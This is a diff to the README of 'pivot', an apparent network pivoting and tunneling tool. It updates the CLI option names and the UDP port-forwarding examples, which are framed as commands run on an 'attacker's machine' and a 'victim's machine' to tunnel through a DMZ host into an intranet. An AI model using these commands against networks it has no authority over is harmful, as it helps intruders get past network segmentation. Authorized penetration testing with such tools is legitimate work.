@@ -64,11 +64,11 @@ Port forwarding mode
 Usage: pivot fwd [OPTIONS]
 
 Options:
-  -l, --local <LOCAL>    Local listen IP address, format: [+][IP:]PORT
-  -r, --remote <REMOTE>  Remote connect IP address, format: [+]IP:PORT
-  -s, --socket <SOCKET>  Unix domain socket path
-  -u, --udp              Enable UDP forward mode
-  -h, --help             Print help
+  -l, --locals <LOCALS>      Local listen IP address, format: [+][IP:]PORT
+  -r, --remotes <REMOTES>    Remote connect IP address, format: [+]IP:PORT
+  -s, --socket <SOCKET>      Unix domain socket path
+  -p, --protocol <PROTOCOL>  Forward Protocol [default: tcp] [possible values: tcp, udp]
+  -h, --help                 Print help (see more with '--help')
 ```
 
 Socks proxy mode
@@ -81,7 +81,7 @@ Socks proxy mode
 Usage: pivot proxy [OPTIONS]
 
 Options:
-  -l, --local <LOCAL>    Local listen IP address, format: [+][IP:]PORT
+  -l, --locals <LOCALS>  Local listen IP address, format: [+][IP:]PORT
   -r, --remote <REMOTE>  Reverse server IP address, format: [+]IP:PORT
   -a, --auth <AUTH>      Authentication info, format: user:pass (other for random)
   -h, --help             Print help
@@ -161,9 +161,9 @@ Note that the command on machine B need to be executed last. Because this mode w
 
 ### UDP Port Forwarding
 
-The usage of UDP port forwarding is similar to TCP, simply add `-u` flag.
+The usage of UDP port forwarding is similar to TCP, simply add `-p udp` parameter.
 
-This feature may be unstable.
+**This feature may be unstable.**
 
 Note that when using **reverse** UDP port forwarding, a handshake packet will be sent to keep the client address.
 
@@ -171,10 +171,10 @@ Example:
 
 ```bash
 # on attacker's machine
-./pivot fwd -l 8888 -l 9999
+./pivot fwd -l 8888 -l 9999 -p udp
 
 # on victim's machine
-./pivot fwd -r 10.0.0.1:53 -r vps:8888
+./pivot fwd -r 10.0.0.1:53 -r vps:8888 -p udp
 ```
 
 The victim's machine will send a 4-byte handshake packet (with all 0s) to `vps:8888`, which is the attacker's machine.
@@ -187,13 +187,13 @@ Another example:
 
 ```bash
 # on machine A (10.0.0.1, 192.168.1.1, intranet)
-./pivot fwd -r 10.0.0.10:53 -l 7777
+./pivot fwd -r 10.0.0.10:53 -l 7777 -p udp
 
 # on machine B (192.168.1.2, DMZ)
-./pivot fwd -r 192.168.1.1:7777 -r vps:8888 # this command need to be executed last
+./pivot fwd -r 192.168.1.1:7777 -r vps:8888 -p udp # this command need to be executed last
 
 # on attacker's machine
-./pivot fwd -l 8888 -l 9999
+./pivot fwd -l 8888 -l 9999 -p udp
 ```
 
 The handshake packet will be sent from machine B to the attacker's machine (port 8888). Users can connect to the intranet through port 9999.
